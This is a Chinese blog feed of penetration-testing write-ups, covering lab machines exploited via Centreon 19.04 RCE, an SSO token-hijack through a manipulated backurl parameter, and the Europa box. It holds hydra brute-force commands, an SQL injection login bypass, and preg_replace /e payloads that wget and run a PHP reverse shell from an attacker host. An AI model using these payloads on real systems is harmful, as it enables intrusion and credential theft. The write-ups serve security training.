    <content type="html"><![CDATA[<p>参考资料：</p><ul><li><p><a href="http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/">http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/</a></p></li><li><p><a href="https://www.cnblogs.com/rainy-shurun/p/5374789.html">apache Modsecurity waf绕过</a></p></li><li><p><a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/</a></p></li></ul><p>最近太忙了ORZ，这篇没做完…</p><h2 id="enumeration"><a href="#enumeration" class="headerlink" title="enumeration"></a>enumeration</h2><p>22，80</p><p>Apache/2.4.29 (Ubuntu) Server </p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/1.PNG" alt="1"><br>说明用户名可能是admin</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /usr/share/wordlists<br> <span class="hljs-attribute">hydra</span> -l admin -P rockyou.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br><br> <span class="hljs-attribute">hydra</span> -l admin -P <span class="hljs-number">3000</span>-pass.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br> <span class="hljs-attribute">hydra</span> -l panel -P rockyou.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br> <span class="hljs-attribute">hydra</span> -l aa -P rockyou.txt -s <span class="hljs-number">80</span> -f <span class="hljs-number">10.10.10.157</span> http-get /monitoring<br></code></pre></div></td></tr></table></figure><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/6.PNG" alt="6"></p><hr><p>searchsploit -m exploits/linux/remote/45233.py<br>python 45233.py（type error代码错误）</p><p>searchsploit -m exploits/linux/remote/45210.py<br>python 45210.py (TypeError)</p><p>searchsploit -m exploits/linux/remote/45939.py<br>python 45939.py –port 22 10.10.10.157 root（TypeError: an integer is required）</p><hr><p>hydra -l admin -P rockyou.txt 10.10.10.157 ssh</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="enumeration-1"><a href="#enumeration-1" class="headerlink" title="enumeration"></a>enumeration</h3><p>dirb <a href="http://10.10.10.157/">http://10.10.10.157</a> -X .php<br>存在的目录<br><a href="http://10.10.10.157/aa.php">http://10.10.10.157/aa.php</a><br><a href="http://10.10.10.157/monitoring/">http://10.10.10.157/monitoring/</a><br><a href="http://10.10.10.157/panel.php">http://10.10.10.157/panel.php</a><br><a href="http://10.10.10.157/centreon">http://10.10.10.157/centreon</a></p><p>nikto -h <a href="http://10.10.10.157/">http://10.10.10.157</a><br>GET, POST, OPTIONS, HEAD </p><hr><p>未发现目录遍历</p><p>10.10.10.157/monitoring/../panel.php</p><p>跳转到panel.php</p><p>10.10.10.157/monitoring/../../../../../../../../../etc/passwd<br>无效</p><hr><p>get改post请求，绕过登陆页面。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/7.PNG" alt="7"></p><p>searchsploit centreon</p><p>searchsploit -m exploitdb/exploits/php/webapps/47069.py<br>v. 19.04.0</p><p><a href="https://gist.githubusercontent.com/mhaskar/c4255f6cf45b19b8a852c780f50576da/raw/f50ab5b4582986ca595055e53417bc2dfce1838e/centreon-exploit.py">exp下载地址</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/8.PNG" alt="8"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/9.PNG" alt="9"></p><p><code>python3.6 47069.py http://10.10.10.157/centreon admin passwd1 10.10.14.10 1330</code></p><p>执行后报错，于是修改exp。</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">。。。。。。<br>  poller_soup = BeautifulSoup(poller_html)<br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;47069.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">57</span>, in <span class="hljs-symbol">&lt;module&gt;</span><br>    poller_token = poller_soup.findAll(<span class="hljs-string">&#x27;input&#x27;</span>)[<span class="hljs-number">24</span>].<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;value&quot;</span>)<br>IndexError: <span class="hljs-keyword">list</span> <span class="hljs-built_in">index</span> out of <span class="hljs-built_in">range</span><br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/10.PNG" alt="10"></p><p>poller_token = poller_soup.find(‘input’, {‘name’: ‘centreon_token’}).get(‘value’)</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/11.PNG" alt="11"></p><p>python3 centreon-exploit.py <a href="http://10.10.10.157/centreon">http://10.10.10.157/centreon</a> admin passwd1 IP 8080</p><p>反弹shell失败</p><p>修改后，无报错的exp地址：<a href="https://github.com/Whale3070/ctf-coding/blob/master/47069.py">https://github.com/Whale3070/ctf-coding/blob/master/47069.py</a></p><h2 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h2><p>python3 47069.py <a href="http://10.10.10.157/centreon">http://10.10.10.157/centreon</a> admin password1 10.10.14.18 8081</p><hr><p><a href="http://10.10.10.157/centreon/Themes/Centreon-2/">http://10.10.10.157/centreon/Themes/Centreon-2/</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/12.PNG" alt="12"><br>目录遍历漏洞</p><hr><ul><li><a href="http://10.10.10.157/centreon/a.php">http://10.10.10.157/centreon/a.php</a> (CODE:200|SIZE:1)                                                   </li><li><a href="http://10.10.10.157/centreon/index.php">http://10.10.10.157/centreon/index.php</a> (CODE:200|SIZE:3091)                                            </li><li><a href="http://10.10.10.157/centreon/main.php">http://10.10.10.157/centreon/main.php</a> (CODE:302|SIZE:0)<br><a href="http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1">http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1</a><br>nagios_bin参数</li></ul><p><a href="http://10.10.10.157/centreon/main.get.php?p=60901">http://10.10.10.157/centreon/main.get.php?p=60901</a><br><a href="http://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php">http://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php</a></p><hr><p>测试命令执行是否成功，修改payload为</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">wget http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">14.10</span>:<span class="hljs-number">888</span>/<span class="hljs-number">1</span>.txt <span class="hljs-comment">#</span><br></code></pre></div></td></tr></table></figure><p>失败<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/13.PNG" alt="13"></p><hr><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">hydra -L <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt  -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -V -s <span class="hljs-number">80</span> <br><br><span class="hljs-number">10.10</span>.<span class="hljs-number">10.157</span> http-post-form <span class="hljs-string">&quot;/centreon/index.php:useralias=^USER^&amp;password=^PASS^&amp;submitLogin=Connect&amp;centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.&quot;</span><br><br>hydra -l centreon  -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -V -s <span class="hljs-number">80</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.157</span> http-post-form <span class="hljs-string">&quot;/centreon/index.php:useralias=^USER^&amp;password=^PASS^&amp;submitLogin=Connect&amp;centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.&quot;</span><br><br>hydra -l admin  -P <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt -V -s <span class="hljs-number">80</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.157</span> http-post-form <span class="hljs-string">&quot;/centreon/index.php:useralias=^USER^&amp;password=^PASS^&amp;submitLogin=Connect&amp;centreon_token=d9ab2ad282b929cf8f32486cee14da85:Your credentials are incorrect.&quot;</span> -t <span class="hljs-number">4</span><br><br>admin/password1<br>centreon/<span class="hljs-comment">#1bitch</span><br></code></pre></div></td></tr></table></figure><h2 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h2><p>centreon 19.04 rce<br>后台弱口令<br>apache目录遍历</p><h2 id="根据python-exp手动利用漏洞"><a href="#根据python-exp手动利用漏洞" class="headerlink" title="根据python exp手动利用漏洞"></a>根据python exp手动利用漏洞</h2><p>19.04 版本漏洞<br><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html">https://www.cvedetails.com/vulnerability-list/vendor_id-7565/product_id-12778/version_id-303583/Centreon-Centreon-19.04.0.html</a></p><p>开启burp，首先访问<a href="http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1">http://10.10.10.157/centreon/main.php?p=60901&amp;o=c&amp;server_id=1</a></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/17.PNG" alt="17"></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/11-09-09/16.PNG" alt="16"><br>注意图中的testpath</p><p>待续</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sso登陆劫持漏洞</title>
    <link href="/2019/10/30/11-x/"/>
    <url>/2019/10/30/11-x/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>最近项目遇到这个漏洞，但是我没有发现。。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>参考资料：</p><ul><li><p><a href="http://www.anquan.us/static/bugs/wooyun-2010-0118.html">腾讯单点登录系统跨域劫持漏洞</a></p></li><li><p><a href="https://lvwei.me/passport.html#toc_8">https://lvwei.me/passport.html#toc_8</a></p></li></ul><p>sso单点登陆，用户一次登陆，所有系统都可访问。</p><p>sso设计目的是简化登陆方式，可能有很多系统，但是多个系统都是一个机构的，每个系统每次都要分别登陆就很复杂。</p><p>举个例子，OpenID是一个很流行的sso框架，</p><p>用户提交1. openID 2.openID Provider（提供者）</p><p>网站重定向到openID provider认证，登陆成功后，再重定向回网站。</p><p>这里可以理解为，门卫不知道你是谁，然后让你去某某处盖章，你去盖章完成后回到门卫处，门外验证红章没问题就让你通过。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://abc.com/public/pages/login/index.html?backurl=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fabc.com%<span class="hljs-number">2</span>FAccount%<span class="hljs-number">2</span>FLogin%<span class="hljs-number">3</span>FReturnUrl%<span class="hljs-number">3</span>D%<span class="hljs-number">252</span>f&amp;app=YuLinTu<br></code></pre></div></td></tr></table></figure><p>此处有一个参数backurl=abc.com，当修改此参数为backurl=abc.com.test</p><p>网页向abc.com.test，也就是openID Provider（提供者）提交一串openID。</p><p>提交后，网页提示无法连接abc.com.test，并且抓取到了一段数据包，包含了登陆成功的token。 </p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-30-11/4.PNG" alt="4"></p><p>由于客户可以伪造openID Provider（提供者），此处产生了sso登陆劫持漏洞。下列的sid是token。如果使用以下token，再次访问<a href="http://abc.com.test/Account/Login%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E5%B7%B2%E7%BB%8F%E7%99%BB%E9%99%86%E3%80%82">http://abc.com.test/Account/Login，可以发现已经登陆。</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://abc.com.test/Account/Login?ReturnUrl=%<span class="hljs-number">2</span>f&amp;sid=c<span class="hljs-number">4</span>d<span class="hljs-number">4</span>e<span class="hljs-number">77</span>e<span class="hljs-number">80</span>ad<span class="hljs-number">1</span>ee<span class="hljs-number">5</span>c<span class="hljs-number">682</span><br><span class="hljs-attribute">8122a38b90d18077aeea4feb963a6c465e4691f65e767f11f935de6c3616</span><br></code></pre></div></td></tr></table></figure><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>攻击者可以将backurl修改为自己的地址，然后发送恶意连接<br><code>http://abc.com/public/pages/login/index.html?backurl=http%3A%2F%2F恶意地址%2FAccount%2FLogin%3FReturnUrl%3D%252f&amp;app=YuLinTu</code></p><p>一旦受害者点击链接，并输入正确的用户名和密码。恶意地址会收到如下的get请求“GET /Account/Login?ReturnUrl=%2f&amp;sid=96c2182d0da29dc720fab468734fef9e47ced2993df16fda6b03c98e92f6e77475b4cf56623430d6 ”</p><p>攻击者就可以使用token sid=xxx，以受害者的身份进行登陆abc.com。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Europa(php rce)</title>
    <link href="/2019/10/27/09-x/"/>
    <url>/2019/10/27/09-x/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>一天可以当两天用，可是当十天不行。<br>不要低估日积月累的作用。</p><h2 id="scan"><a href="#scan" class="headerlink" title="scan"></a>scan</h2><figure class="highlight coq"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coq"><span class="hljs-number">22</span>/tcp  open  ssh      OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey: <br>|   <span class="hljs-type">2048</span> <span class="hljs-number">6</span>b:<span class="hljs-number">55</span>:<span class="hljs-number">42</span>:<span class="hljs-number">0</span>a:f7:<span class="hljs-number">06</span>:<span class="hljs-number">8</span>c:<span class="hljs-number">67</span>:c0:e2:<span class="hljs-number">5</span>c:<span class="hljs-number">05</span>:db:<span class="hljs-number">09</span>:fb:<span class="hljs-number">78</span> (RSA)<br>|   <span class="hljs-type">256</span> b1:ea:<span class="hljs-number">5</span>e:c4:<span class="hljs-number">1</span>c:<span class="hljs-number">0</span>a:<span class="hljs-number">96</span>:<span class="hljs-number">9</span>e:<span class="hljs-number">93</span>:db:<span class="hljs-number">1</span>d:ad:<span class="hljs-number">22</span>:<span class="hljs-number">50</span>:<span class="hljs-number">74</span>:<span class="hljs-number">75</span> (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">33</span>:<span class="hljs-number">1</span>f:<span class="hljs-number">16</span>:<span class="hljs-number">8</span>d:c0:<span class="hljs-number">24</span>:<span class="hljs-number">78</span>:<span class="hljs-number">5</span>f:<span class="hljs-number">5</span>b:f5:<span class="hljs-number">6</span>d:<span class="hljs-number">7</span>f:f7:b4:f2:e5 (EdDSA)<br><span class="hljs-number">80</span>/tcp  open  http     Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: Apache2 Ubuntu Default Page: It works<br><span class="hljs-number">443</span>/tcp open  ssl/http Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br>|<span class="hljs-type">_http</span>-title: <span class="hljs-number">400</span> Bad Request<br>| <span class="hljs-type">ssl</span>-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR<br>| <span class="hljs-type">Subject</span> Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb<br>| <span class="hljs-type">Not</span> valid <span class="hljs-built_in">before</span>: <span class="hljs-number">2017</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T09:<span class="hljs-number">06</span>:<span class="hljs-number">22</span><br>|<span class="hljs-type">_Not</span> valid <span class="hljs-built_in">after</span>:  <span class="hljs-number">2027</span><span class="hljs-number">-04</span><span class="hljs-number">-17</span>T09:<span class="hljs-number">06</span>:<span class="hljs-number">22</span><br>|<span class="hljs-type">_ssl</span>-date: TLS randomness does not represent <span class="hljs-built_in">time</span><br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>http://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span> [<span class="hljs-number">200</span> OK] Apache[<span class="hljs-number">2.4</span><span class="hljs-number">.18</span>], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)], IP[<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span>], PoweredBy[&#123;], <span class="hljs-keyword">Script</span>[text/javascript], Title[Apache2 Ubuntu Default Page: It works]<br></code></pre></div></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><a href="http://10.10.10.22/">http://10.10.10.22</a></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gobuster -u https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt -e -k<br>https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb/data (Status: <span class="hljs-number">301</span>)<br>https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb/js (Status: <span class="hljs-number">301</span>)<br>https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb/vendor (Status: <span class="hljs-number">301</span>)<br>https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb/dist (Status: <span class="hljs-number">301</span>)<br>https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb/logs (Status: <span class="hljs-number">301</span>)<br>https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb/server-status (Status: <span class="hljs-number">403</span>)<br>---<br>gobuster -u https:<span class="hljs-regexp">//</span>www.europacorp.htb -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt -e -k<br><br>gobuster -u https:<span class="hljs-regexp">//</span>europacorp.htb -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirbuster/directory-list-<span class="hljs-number">2.3</span>-medium.txt -e -k<br></code></pre></div></td></tr></table></figure><h3 id="查找版本漏洞"><a href="#查找版本漏洞" class="headerlink" title="查找版本漏洞"></a>查找版本漏洞</h3><p>searchsploit apache 2</p><p>Apache &lt; 2.2.34 / &lt; 2.4.27 - OPTIONS Memory Leak                                                            | exploits/linux/webapps/42745.py<br>searchsploit -m exploits/linux/webapps/42745.py<br>python3 42745.py -u <a href="https://10.10.10.22/">https://10.10.10.22/</a> -a</p><p>Optionsbleed 漏洞未发现</p><h3 id="https"><a href="#https" class="headerlink" title="https"></a>https</h3><p>ssl/http Apache httpd 2.4.18 ((Ubuntu))<br>参考资料：<a href="http://liaoph.com/openssl-san/">http://liaoph.com/openssl-san/</a></p><p>SAN(Subject Alternative Name) 是 SSL 标准 x509 中定义的一个扩展。使用了 SAN 字段的 SSL 证书，可以扩展此证书支持的域名，使得一个证书可以支持多个不同域名的解析。</p><p><code>sslyze --regular 10.10.10.22</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-27-09/4.PNG" alt="4"></p><p>？<br><a href="https://whale3070.github.io/training/2017/11/02/%E8%BF%98%E6%98%AFkioptrix-LFI%E4%B8%8E%E6%B3%A8%E5%85%A5/">以前遇到过</a><br>将域名和ip绑定，访问网站就会正常显示。而直接通过ip访问，网站不能正常解析。<br>当时没有深入探究，是什么导致的。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-27-09/5.PNG" alt="5"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">X509v3 Subject Alternative Name:   &#123;<span class="hljs-string">&#x27;DNS&#x27;</span>: [<span class="hljs-string">&#x27;www.europacorp.htb&#x27;</span>, <span class="hljs-string">&#x27;admin-portal.europacorp.htb&#x27;</span>]&#125;<br>echo <span class="hljs-number">10.10</span>.<span class="hljs-number">10.22</span> admin-portal.europacorp.htb &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br>echo <span class="hljs-number">10.10</span>.<span class="hljs-number">10.22</span> www.europacorp.htb &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br>echo <span class="hljs-number">10.10</span>.<span class="hljs-number">10.22</span> europacorp.htb &gt;&gt; <span class="hljs-regexp">/etc/</span>hosts<br><br>https:<span class="hljs-regexp">//</span>admin-portal.europacorp.htb 一个登陆表单<br>https:<span class="hljs-regexp">//</span>www.europacorp.htb apache2默认配置页面<br>https:<span class="hljs-regexp">//</span>europacorp.htb 同上<br></code></pre></div></td></tr></table></figure><p>wget <a href="https://admin-portal.europacorp.htb/">https://admin-portal.europacorp.htb</a> –no-check-certificate -O admin-portal.europacorp.htb</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-27-09/33.PNG" alt="33"></p><p>burp将数据包copy to file，选择保存为1.txt<br><code>sqlmap -r 1.txt --dbms mysql -p email --force-ssl --dump</code></p><p>获得数据库内容后，得知了用户名是<a href="mailto:&#97;&#100;&#109;&#x69;&#110;&#x40;&#x65;&#x75;&#114;&#111;&#112;&#x61;&#x63;&#x6f;&#x72;&#112;&#x2e;&#104;&#x74;&#x62;">&#97;&#100;&#109;&#x69;&#110;&#x40;&#x65;&#x75;&#114;&#111;&#112;&#x61;&#x63;&#x6f;&#x72;&#112;&#x2e;&#104;&#x74;&#x62;</a></p><p>以下列的数据登入后台。<br>email=admin@europacorp.htb’ or ‘1’=’1&amp;password=098098</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>看到网页上有个输入点，立刻想到了命令执行漏洞，burp抓包看一下。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-27-09/34.PNG" alt="34"></p><figure class="highlight arcade"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arcade">pattern=<span class="hljs-regexp">/ip_address/</span>&amp;ipaddress=<span class="hljs-number">123123</span>&amp;text=<span class="hljs-string">&quot;openvpn&quot;</span>: &#123;<br><br>这个代码是页面输入<span class="hljs-number">123123</span>的时候，页面post的参数。<br><br>如果修改pattern=<span class="hljs-regexp">/ip_address/</span>，为pattern=<span class="hljs-regexp">/vtun0/</span>，可以观察到页面的响应改变了，此处做了一个替换。<span class="hljs-number">123123</span>的位置由ip_address的位置改为了vth0的位置。<br><br>这里是用正则表达式替换的，而php的函数preg_replace()有个代码执行漏洞。<br><br>**preg_replace** 函数 **/e** 模式执行代码的时候会转义特殊字符。<br></code></pre></div></td></tr></table></figure><p>参考资料：</p><ul><li><a href="http://www.madirish.net/402">http://www.madirish.net/402</a></li><li><a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#%E6%A1%88%E4%BE%8B">深入研究preg_replace与代码执行</a></li><li><a href="https://whale3070.github.io/web/2018/11/18/x/">常见web漏洞-command execution</a></li></ul><p>pattern=/^(.*)/e&amp;ipaddress=system(<code>wget http://10.10.14.18:1234/php-reverse-shell.php -P /tmp</code>);&amp;text=</p><p>pattern=/^(.*)/e&amp;ipaddress=system(<code>php -f /tmp/php-reverse-shell.php</code>);&amp;text=</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/10-27-09/35.PNG" alt="35"></p><p>得到一个权限为www-data的shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">python3 -c &#x27;import pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br><span class="hljs-keyword">cd</span> /tmp;wget http:<span class="hljs-comment">//10.10.14.18:80/LinEnum.sh</span><br>chmod +x LinEnum.<span class="hljs-keyword">sh</span><br>./LinEnum.<span class="hljs-keyword">sh</span><br><br>查看信息搜集结果，<br>内核版本挺高的，不存在内核漏洞提权<br>有效的用户有root、john<br><br>存在的定时任务crontab<br><span class="hljs-keyword">cat</span> /<span class="hljs-keyword">var</span>/www/cronjobs/clearlogs<br><br>#!/usr/bin/php<br>&lt;?php<br><span class="hljs-variable">$file</span> = &#x27;/<span class="hljs-keyword">var</span>/www/admin/logs/access.<span class="hljs-keyword">log</span>&#x27;;<br>file_put_contents(<span class="hljs-variable">$file</span>, &#x27;&#x27;);<br>exec(&#x27;/<span class="hljs-keyword">var</span>/www/cmd/logcleared.<span 